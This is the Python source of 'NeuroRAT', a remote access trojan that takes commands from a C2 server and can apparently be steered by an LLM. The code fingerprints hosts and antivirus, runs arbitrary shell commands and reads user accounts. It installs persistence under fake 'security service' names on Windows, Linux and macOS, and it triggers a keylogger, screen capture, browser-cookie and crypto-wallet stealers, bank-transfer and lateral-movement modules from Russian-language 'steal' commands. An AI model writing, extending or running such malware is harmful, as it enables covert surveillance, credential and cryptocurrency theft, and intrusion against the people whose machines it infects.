#!/usr/bin/env python3
"""
NeuroRAT Agent - Autonomous AI-Powered RAT Agent
Uses the agent_protocol infrastructure for secure communication.
"""

import os
import sys
import time
import uuid
import json
import socket
import platform
import subprocess
import threading
import logging
import base64
import importlib
import tempfile
from typing import Dict, Any, Optional, List, Tuple, Union, Callable

# Add parent directory to sys.path to import agent_protocol modules
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import agent protocol components
from agent_protocol.agent import Agent
from agent_protocol.shared.protocol import Command, Response, CommandType

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('neurorat_agent.log')
    ]
)
logger = logging.getLogger('neurorat_agent')

class NeuroRATAgent:
    """
    Main agent class for NeuroRAT - an autonomous RAT with AI capabilities.
    """
    
    def __init__(
        self,
        server_host: str,
        server_port: int,
        agent_id: Optional[str] = None,
        auth_token: Optional[str] = None,
        use_ssl: bool = False,
        ca_cert: Optional[str] = None,
        client_cert: Optional[str] = None,
        client_key: Optional[str] = None,
        use_encryption: bool = True,
        persistence: bool = False
    ):
        """
        Initialize the NeuroRAT agent.
        
        Args:
            server_host: C2 server host
            server_port: C2 server port
            agent_id: Agent identifier (generated if not provided)
            auth_token: Authentication token
            use_ssl: Whether to use SSL for connection
            ca_cert: Path to CA certificate
            client_cert: Path to client certificate
            client_key: Path to client key
            use_encryption: Whether to encrypt data
            persistence: Whether to establish persistence on the system
        """
        self.server_host = server_host
        self.server_port = server_port
        self.agent_id = agent_id or str(uuid.uuid4())
        self.auth_token = auth_token
        self.use_ssl = use_ssl
        self.use_encryption = use_encryption
        self.persistence = persistence
        
        # System information
        self.system_info = self._collect_system_info()
        
        # Create the agent using the agent protocol
        self.agent = Agent(
            server_host=server_host,
            server_port=server_port,
            agent_id=self.agent_id,
            auth_token=auth_token,
            use_ssl=use_ssl,
            ca_cert=ca_cert,
            client_cert=client_cert,
            client_key=client_key,
            use_encryption=use_encryption
        )
        
        # Register our command handlers
        self._register_command_handlers()
        
        # Modules storage
        self.modules = {}
        
        # Initialize module loader if available
        self.module_loader = None
        try:
            from agent_modules.module_loader import ModuleLoader
            self.module_loader = ModuleLoader(
                output_dir=os.path.join(os.getcwd(), "extracted_data")
            )
            logger.info("Module loader initialized successfully")
        except ImportError:
            logger.warning("Module loader not available")
        
        # LLM processing capability
        self.llm_processor = None
        try:
            # Try to import llm_processor.py if it exists
            from llm_processor import LLMProcessor
            self.llm_processor = LLMProcessor()
            logger.info("LLM processor loaded successfully")
        except ImportError:
            logger.warning("LLM processor not available")
        
        # Persistence mechanisms
        if persistence:
            self._establish_persistence()
    
    def _register_command_handlers(self):
        """Register custom command handlers for the agent."""
        # Override the LLM query handler
        self.agent.command_handlers[CommandType.LLM_QUERY] = self._handle_llm_query
        
        # Add handlers for new command types if they exist
        try:
            # Check if these command types exist in the protocol
            if hasattr(CommandType, "RUN_MODULE"):
                self.agent.command_handlers[CommandType.RUN_MODULE] = self._handle_run_module
            if hasattr(CommandType, "CAPTURE_SCREEN"):
                self.agent.command_handlers[CommandType.CAPTURE_SCREEN] = self._handle_capture_screen
            if hasattr(CommandType, "KEYLOGGER"):
                self.agent.command_handlers[CommandType.KEYLOGGER] = self._handle_keylogger
        except Exception as e:
            logger.error(f"Error registering custom command handlers: {str(e)}")
    
    def _collect_system_info(self) -> Dict[str, Any]:
        """Collect detailed system information."""
        info = {
            "os": platform.system(),
            "os_release": platform.release(),
            "os_version": platform.version(),
            "architecture": platform.machine(),
            "processor": platform.processor(),
            "hostname": socket.gethostname(),
            "username": self._get_username_safely(),
            "python_version": platform.python_version(),
            "network": self._get_network_info(),
            "timestamp": time.time()
        }
        
        # Add more detailed OS-specific information
        if platform.system() == "Windows":
            info.update(self._get_windows_info())
        elif platform.system() == "Linux":
            info.update(self._get_linux_info())
        elif platform.system() == "Darwin":
            info.update(self._get_mac_info())
        
        return info
    
    def _get_username_safely(self) -> str:
        """Safely get the username without causing errors in containers."""
        # Try different methods to get the username
        try:
            return os.getlogin()
        except:
            pass
        
        # Try environment variables
        for env_var in ['USER', 'USERNAME', 'LOGNAME']:
            username = os.getenv(env_var)
            if username:
                return username
        
        # Try pwd module on Unix-like systems
        try:
            import pwd
            return pwd.getpwuid(os.getuid()).pw_name
        except:
            pass
        
        # If all else fails
        return "unknown_user"
    
    def _get_network_info(self) -> Dict[str, Any]:
        """Get network information."""
        network_info = {
            "interfaces": [],
            "hostname": socket.gethostname()
        }
        
        try:
            # Get IP address
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            # Doesn't need to be reachable
            s.connect(('10.255.255.255', 1))
            network_info["ip_address"] = s.getsockname()[0]
            s.close()
        except:
            network_info["ip_address"] = '127.0.0.1'
        
        # Try to get more detailed network info
        try:
            if platform.system() == "Windows":
                # Use ipconfig on Windows
                output = subprocess.check_output("ipconfig /all", shell=True).decode('utf-8', errors='ignore')
                # Parse output (simplified)
                network_info["ipconfig"] = output
            else:
                # Use ifconfig on Unix-like systems
                try:
                    output = subprocess.check_output("ifconfig", shell=True).decode('utf-8', errors='ignore')
                except:
                    output = subprocess.check_output("ip addr", shell=True).decode('utf-8', errors='ignore')
                network_info["ifconfig"] = output
        except:
            pass
        
        return network_info
    
    def _get_windows_info(self) -> Dict[str, Any]:
        """Get Windows-specific system information."""
        win_info = {}
        
        try:
            # Get Windows version info
            win_info["windows_edition"] = platform.win32_edition()
            win_info["windows_version"] = platform.win32_ver()
            
            # Get current user context
            win_info["is_admin"] = self._is_admin_windows()
            
            # Get antivirus info (simplified)
            try:
                output = subprocess.check_output(
                    "wmic /namespace:\\\\root\\SecurityCenter2 path AntivirusProduct get displayName,productState /format:list", 
                    shell=True
                ).decode('utf-8', errors='ignore')
                win_info["antivirus_info"] = output
            except:
                win_info["antivirus_info"] = "Failed to retrieve"
            
        except Exception as e:
            logger.error(f"Error getting Windows info: {str(e)}")
        
        return win_info
    
    def _get_linux_info(self) -> Dict[str, Any]:
        """Get Linux-specific system information."""
        linux_info = {}
        
        try:
            # Get Linux distribution info
            try:
                import distro
                linux_info["distribution"] = distro.name()
                linux_info["distro_version"] = distro.version()
                linux_info["distro_codename"] = distro.codename()
            except ImportError:
                try:
                    with open("/etc/os-release") as f:
                        os_release = {}
                        for line in f:
                            if "=" in line:
                                key, value = line.rstrip().split("=", 1)
                                os_release[key] = value.strip('"')
                        linux_info["distribution"] = os_release.get("NAME", "")
                        linux_info["distro_version"] = os_release.get("VERSION_ID", "")
                except:
                    linux_info["distribution"] = "Unknown"
            
            # Get current user context
            linux_info["is_root"] = os.geteuid() == 0 if hasattr(os, 'geteuid') else False
            linux_info["user_groups"] = subprocess.check_output("groups", shell=True).decode().strip()
            
            # Get kernel version
            linux_info["kernel_version"] = subprocess.check_output("uname -r", shell=True).decode().strip()
            
        except Exception as e:
            logger.error(f"Error getting Linux info: {str(e)}")
        
        return linux_info
    
    def _get_mac_info(self) -> Dict[str, Any]:
        """Get macOS-specific system information."""
        mac_info = {}
        
        try:
            # Get macOS version
            mac_info["osx_version"] = platform.mac_ver()[0]
            
            # Get current user context
            mac_info["is_admin"] = self._is_admin_mac()
            
            # Get SIP status
            try:
                output = subprocess.check_output("csrutil status", shell=True).decode()
                mac_info["sip_status"] = output.strip()
            except:
                mac_info["sip_status"] = "Unknown"
            
        except Exception as e:
            logger.error(f"Error getting Mac info: {str(e)}")
        
        return mac_info
    
    def _is_admin_windows(self) -> bool:
        """Check if running with administrator privileges on Windows."""
        try:
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except:
            return False
    
    def _is_admin_mac(self) -> bool:
        """Check if running with administrator privileges on macOS."""
        try:
            return os.getuid() == 0
        except:
            return False
    
    def _establish_persistence(self):
        """Establish persistence on the system."""
        logger.info("Attempting to establish persistence...")
        
        system = platform.system()
        
        if system == "Windows":
            self._establish_persistence_windows()
        elif system == "Linux":
            self._establish_persistence_linux()
        elif system == "Darwin":
            self._establish_persistence_mac()
        
        logger.info("Persistence mechanisms established")
    
    def _establish_persistence_windows(self):
        """Establish persistence on Windows."""
        try:
            # Registry method
            import winreg
            
            # Get the current executable path
            current_exe = sys.executable
            if current_exe.endswith("python.exe") or current_exe.endswith("pythonw.exe"):
                # If running as a script, create a Registry entry for the script
                script_path = os.path.abspath(__file__)
                run_command = f'"{current_exe}" "{script_path}" --server {self.server_host} --port {self.server_port}'
            else:
                # If running as an executable
                run_command = f'"{current_exe}" --server {self.server_host} --port {self.server_port}'
            
            # Add to Run registry
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
            winreg.SetValueEx(key, "SystemSecurityService", 0, winreg.REG_SZ, run_command)
            winreg.CloseKey(key)
            
            logger.info("Established persistence via Registry Run key")
        except Exception as e:
            logger.error(f"Failed to establish Windows persistence: {str(e)}")
    
    def _establish_persistence_linux(self):
        """Establish persistence on Linux."""
        try:
            # Create systemd user service
            service_path = os.path.expanduser("~/.config/systemd/user/")
            os.makedirs(service_path, exist_ok=True)
            
            current_exe = sys.executable
            script_path = os.path.abspath(__file__)
            
            service_content = f"""[Unit]
Description=System Security Service
After=network.target

[Service]
Type=simple
ExecStart={current_exe} {script_path} --server {self.server_host} --port {self.server_port}
Restart=always
RestartSec=60

[Install]
WantedBy=default.target
"""
            
            with open(os.path.join(service_path, "security-service.service"), "w") as f:
                f.write(service_content)
            
            # Enable service
            subprocess.run(["systemctl", "--user", "enable", "security-service.service"], check=False)
            
            logger.info("Established persistence via systemd user service")
        except Exception as e:
            logger.error(f"Failed to establish Linux persistence: {str(e)}")
    
    def _establish_persistence_mac(self):
        """Establish persistence on macOS."""
        try:
            # Create Launch Agent plist
            launch_agents_path = os.path.expanduser("~/Library/LaunchAgents/")
            os.makedirs(launch_agents_path, exist_ok=True)
            
            current_exe = sys.executable
            script_path = os.path.abspath(__file__)
            
            plist_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.security.service</string>
    <key>ProgramArguments</key>
    <array>
        <string>{current_exe}</string>
        <string>{script_path}</string>
        <string>--server</string>
        <string>{self.server_host}</string>
        <string>--port</string>
        <string>{self.server_port}</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
"""
            
            with open(os.path.join(launch_agents_path, "com.security.service.plist"), "w") as f:
                f.write(plist_content)
            
            # Load Launch Agent
            subprocess.run(["launchctl", "load", os.path.join(launch_agents_path, "com.security.service.plist")], check=False)
            
            logger.info("Established persistence via Launch Agent")
        except Exception as e:
            logger.error(f"Failed to establish macOS persistence: {str(e)}")
    
    def _handle_llm_query(self, command: Command) -> Response:
        """
        Handle LLM queries from the server.
        
        This is the core functionality for autonomous operation - the server sends
        instructions which the agent processes using LLM capabilities and executes.
        """
        try:
            query = command.data.get("query", "")
            is_autonomous = command.data.get("autonomous", False)
            context = command.data.get("context", {})
            
            logger.info(f"Received LLM query: {query}")
            
            if not query:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    data={},
                    message="Empty query"
                )
            
            # If we have an LLM processor, use it
            if self.llm_processor:
                result = self.llm_processor.process_query(query, context, is_autonomous)
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data=result
                )
            
            # Basic query parsing if no LLM processor
            if query.startswith("collect_info:"):
                # Format: collect_info: [info_type]
                info_type = query.split(":", 1)[1].strip()
                return self._handle_info_collection(info_type, command.command_id)
            elif query.startswith("execute:"):
                # Format: execute: [command]
                cmd = query.split(":", 1)[1].strip()
                return self._handle_shell_execution(cmd, command.command_id)
            # --- Tool command interpretation ---
            tool_result = self.handle_text_command(query)
            return Response(
                command_id=command.command_id,
                success=True,
                data={"result": tool_result}
            )
        except Exception as e:
            logger.error(f"Error handling LLM query: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message=f"Error: {str(e)}"
            )
    
    def _handle_info_collection(self, info_type: str, command_id: str) -> Response:
        """Handle information collection requests."""
        result = {}
        
        try:
            if info_type == "system":
                result = self.system_info
            elif info_type == "network":
                result = self._get_network_info()
            elif info_type == "processes":
                result = self._get_running_processes()
            elif info_type == "users":
                result = self._get_user_accounts()
            elif info_type == "files":
                # Get files in home directory
                home_dir = os.path.expanduser("~")
                files = os.listdir(home_dir)
                result = {"directory": home_dir, "files": files}
            else:
                return Response(
                    command_id=command_id,
                    success=False,
                    data={},
                    message=f"Unknown info type: {info_type}"
                )
        except Exception as e:
            return Response(
                command_id=command_id,
                success=False,
                data={},
                message=f"Error collecting {info_type} info: {str(e)}"
            )
        
        return Response(
            command_id=command_id,
            success=True,
            data=result
        )
    
    def _handle_shell_execution(self, command_str: str, command_id: str) -> Response:
        """Handle shell command execution."""
        try:
            output = subprocess.check_output(
                command_str, 
                shell=True, 
                stderr=subprocess.STDOUT
            ).decode('utf-8', errors='ignore')
            
            return Response(
                command_id=command_id,
                success=True,
                data={"output": output}
            )
        except subprocess.CalledProcessError as e:
            return Response(
                command_id=command_id,
                success=False,
                data={"output": e.output.decode('utf-8', errors='ignore') if e.output else ""},
                message=f"Command failed with exit code {e.returncode}"
            )
        except Exception as e:
            return Response(
                command_id=command_id,
                success=False,
                data={},
                message=f"Error executing command: {str(e)}"
            )
    
    def _get_running_processes(self) -> Dict[str, Any]:
        """Get information about running processes."""
        processes = []
        
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("tasklist /fo csv /nh", shell=True).decode('utf-8', errors='ignore')
                for line in output.splitlines():
                    if not line.strip():
                        continue
                    parts = line.strip('"').split('","')
                    if len(parts) >= 2:
                        processes.append({
                            "name": parts[0],
                            "pid": parts[1]
                        })
            else:
                output = subprocess.check_output("ps aux", shell=True).decode('utf-8', errors='ignore')
                for line in output.splitlines()[1:]:  # Skip header
                    parts = line.split(None, 10)
                    if len(parts) >= 2:
                        processes.append({
                            "user": parts[0],
                            "pid": parts[1],
                            "cpu": parts[2],
                            "mem": parts[3],
                            "command": parts[10] if len(parts) > 10 else ""
                        })
        except Exception as e:
            logger.error(f"Error getting process list: {str(e)}")
        
        return {"processes": processes}
    
    def _get_user_accounts(self) -> Dict[str, Any]:
        """Get information about user accounts on the system."""
        users = []
        
        try:
            if platform.system() == "Windows":
                output = subprocess.check_output("wmic useraccount get name,sid", shell=True).decode('utf-8', errors='ignore')
                lines = output.splitlines()[1:]  # Skip header
                for line in lines:
                    parts = line.split()
                    if len(parts) >= 2:
                        users.append({
                            "name": parts[0],
                            "sid": parts[1]
                        })
            else:
                # Unix-like systems
                with open("/etc/passwd", "r") as f:
                    for line in f:
                        if line.strip():
                            parts = line.strip().split(":")
                            if len(parts) >= 7:
                                users.append({
                                    "name": parts[0],
                                    "uid": parts[2],
                                    "gid": parts[3],
                                    "home": parts[5],
                                    "shell": parts[6]
                                })
        except Exception as e:
            logger.error(f"Error getting user accounts: {str(e)}")
        
        return {"users": users}
    
    def _handle_run_module(self, command: Command) -> Response:
        """Handle running a specific module."""
        if not self.module_loader:
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message="Module loader not available"
            )
        
        try:
            module_name = command.data.get("module", "")
            if not module_name:
                # Run all modules if no specific module is requested
                results = self.module_loader.run_all_modules()
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data={"results": results}
                )
            else:
                # Run a specific module
                result = self.module_loader.run_module(module_name)
                return Response(
                    command_id=command.command_id,
                    success=result.get("status") != "error",
                    data={"result": result},
                    message=result.get("message", "")
                )
        except Exception as e:
            logger.error(f"Error running module: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message=f"Error running module: {str(e)}"
            )
    
    def _handle_capture_screen(self, command: Command) -> Response:
        """Handle screen capture request."""
        try:
            # Try to use the screen_capture module
            from agent_modules import screen_capture
            
            # Create temporary directory for screenshots
            temp_dir = tempfile.mkdtemp()
            
            # Create screen capture instance
            screen_capturer = screen_capture.ScreenCapturer(output_dir=temp_dir)
            
            # Take screenshot
            result = screen_capturer.run()
            
            if result.get("status") == "success" and "screenshot_path" in result:
                # Read screenshot data
                with open(result["screenshot_path"], "rb") as f:
                    screenshot_data = f.read()
                
                # Convert to base64
                screenshot_b64 = base64.b64encode(screenshot_data).decode("utf-8")
                
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data={
                        "screenshot": screenshot_b64,
                        "format": "png",
                        "timestamp": time.time()
                    }
                )
            else:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    data={},
                    message=f"Screen capture failed: {result.get('message', 'Unknown error')}"
                )
        except ImportError:
            logger.error("Screen capture module not available")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message="Screen capture module not available"
            )
        except Exception as e:
            logger.error(f"Error capturing screen: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message=f"Error capturing screen: {str(e)}"
            )
    
    def _handle_keylogger(self, command: Command) -> Response:
        """Handle keylogger start/stop requests."""
        try:
            action = command.data.get("action", "")
            duration = command.data.get("duration", 60)  # Default 60 seconds
            
            from agent_modules import keylogger
            
            if action == "start":
                # Create temporary file for keylogger output
                temp_file = tempfile.mktemp(suffix=".txt")
                
                # Start keylogger in a separate thread
                self.keylogger_thread = threading.Thread(
                    target=self._run_keylogger,
                    args=(temp_file, duration)
                )
                self.keylogger_thread.daemon = True
                self.keylogger_thread.start()
                
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data={"status": "started", "duration": duration},
                    message=f"Keylogger started for {duration} seconds"
                )
            elif action == "stop":
                # Stop is handled by the thread timeout, just acknowledge
                return Response(
                    command_id=command.command_id,
                    success=True,
                    data={"status": "stopped"},
                    message="Keylogger stop command acknowledged"
                )
            elif action == "get":
                # Return any collected data if available
                if hasattr(self, "keylogger_result") and self.keylogger_result:
                    return Response(
                        command_id=command.command_id,
                        success=True,
                        data=self.keylogger_result
                    )
                else:
                    return Response(
                        command_id=command.command_id,
                        success=False,
                        data={},
                        message="No keylogger data available"
                    )
            else:
                return Response(
                    command_id=command.command_id,
                    success=False,
                    data={},
                    message=f"Unknown keylogger action: {action}"
                )
        except ImportError:
            logger.error("Keylogger module not available")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message="Keylogger module not available"
            )
        except Exception as e:
            logger.error(f"Error handling keylogger request: {str(e)}")
            return Response(
                command_id=command.command_id,
                success=False,
                data={},
                message=f"Error handling keylogger request: {str(e)}"
            )
    
    def _run_keylogger(self, output_file: str, duration: int):
        """Run keylogger in a separate thread for the specified duration."""
        try:
            from agent_modules import keylogger
            
            # Initialize keylogger
            logger.info(f"Starting keylogger for {duration} seconds")
            kl = keylogger.Keylogger(output_file=output_file)
            
            # Run keylogger for specified duration
            kl.start()
            time.sleep(duration)
            kl.stop()
            
            # Read collected data
            try:
                with open(output_file, "r") as f:
                    keylog_data = f.read()
                
                self.keylogger_result = {
                    "data": keylog_data,
                    "timestamp": time.time(),
                    "duration": duration
                }
                
                logger.info(f"Keylogger finished, collected {len(keylog_data)} bytes")
            except Exception as e:
                logger.error(f"Error reading keylogger data: {str(e)}")
                self.keylogger_result = {
                    "error": str(e),
                    "timestamp": time.time()
                }
        except Exception as e:
            logger.error(f"Error running keylogger: {str(e)}")
            self.keylogger_result = {
                "error": str(e),
                "timestamp": time.time()
            }
    
    def load_and_run_all_modules(self) -> Dict[str, Any]:
        """
        Load and run all available data exfiltration modules.
        Returns a dictionary with the results.
        """
        if not self.module_loader:
            logger.error("Module loader not available")
            return {"status": "error", "message": "Module loader not available"}
        
        try:
            logger.info("Loading and running all modules")
            results = self.module_loader.run_all_modules()
            logger.info(f"All modules executed, results: {results}")
            return results
        except Exception as e:
            logger.error(f"Error running all modules: {str(e)}")
            return {"status": "error", "message": str(e)}
    
    def start(self):
        """Start the agent and connect to the server."""
        logger.info(f"Starting NeuroRAT agent with ID: {self.agent_id}")
        
        # Start the agent protocol agent
        self.agent.start()
        
        # Optionally load modules
        if self.module_loader:
            self.module_loader.load_all_modules()
            logger.info("All modules loaded successfully")
        
        logger.info("Agent started successfully")
    
    def stop(self):
        """Stop the agent and disconnect from the server."""
        logger.info("Stopping NeuroRAT agent")
        self.agent.stop()
        logger.info("Agent stopped")

    def handle_text_command(self, text: str) -> str:
        module, params = self.interpret_tool_command(text)
        if module and self.module_loader:
            result = self.module_loader.run_module(module, **params)
            return f"Модуль {module} выполнен. Результат: {result}"
        else:
            return "Неизвестная команда или инструмент. Используй: cookies, wallet, browser, system, keylogger, vnc."

    def interpret_tool_command(self, text: str):
        """Преобразует текстовую команду в вызов модуля и параметры"""
        t = text.lower()
        if any(x in t for x in ["wallet", "кошелек", "crypto", "btc", "eth", "укради кошелек"]):
            return ("crypto_stealer", {})
        if any(x in t for x in ["cookie", "cookies", "куки", "укради cookies", "cookie stealer"]):
            return ("browser_stealer", {})
        if any(x in t for x in ["browser", "браузер", "browser stealer", "укради браузер"]):
            return ("browser_stealer", {})
        if any(x in t for x in ["system", "sysinfo", "system info", "инфо", "собери инфу", "системная информация"]):
            return ("system_stealer", {})
        if any(x in t for x in ["keylogger", "кейлоггер", "start keylogger", "включи кейлоггер"]):
            return ("keylogger", {"action": "start"})
        if any(x in t for x in ["vnc", "screen", "скрин", "экран", "включи vnc"]):
            return ("screen_capture", {})
        if any(x in t for x in ["ats", "автоматический перевод", "transfer", "ats stealer"]):
            return ("ats", {})
        if any(x in t for x in ["lateral", "латераль", "lateral move", "перемещение"]):
            return ("lateral", {})
        return (None, {})


def main():
    """Main entry point for the agent."""
    import argparse
    
    parser = argparse.ArgumentParser(description="NeuroRAT Agent")
    parser.add_argument("--server", default="localhost", help="C2 server host")
    parser.add_argument("--port", type=int, default=8000, help="C2 server port")
    parser.add_argument("--id", help="Agent ID (generated if not provided)")
    parser.add_argument("--token", help="Authentication token")
    parser.add_argument("--ssl", action="store_true", help="Use SSL")
    parser.add_argument("--ca-cert", help="Path to CA certificate")
    parser.add_argument("--client-cert", help="Path to client certificate")
    parser.add_argument("--client-key", help="Path to client key")
    parser.add_argument("--no-encryption", action="store_true", help="Disable encryption")
    parser.add_argument("--persistence", action="store_true", help="Establish persistence")
    
    args = parser.parse_args()
    
    agent = NeuroRATAgent(
        server_host=args.server,
        server_port=args.port,
        agent_id=args.id,
        auth_token=args.token,
        use_ssl=args.ssl,
        ca_cert=args.ca_cert,
        client_cert=args.client_cert,
        client_key=args.client_key,
        use_encryption=not args.no_encryption,
        persistence=args.persistence
    )
    
    try:
        # Start the agent
        agent.start()
        
        # Keep the main thread running
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Keyboard interrupt received, stopping agent")
    finally:
        agent.stop()


if __name__ == "__main__":
    main() 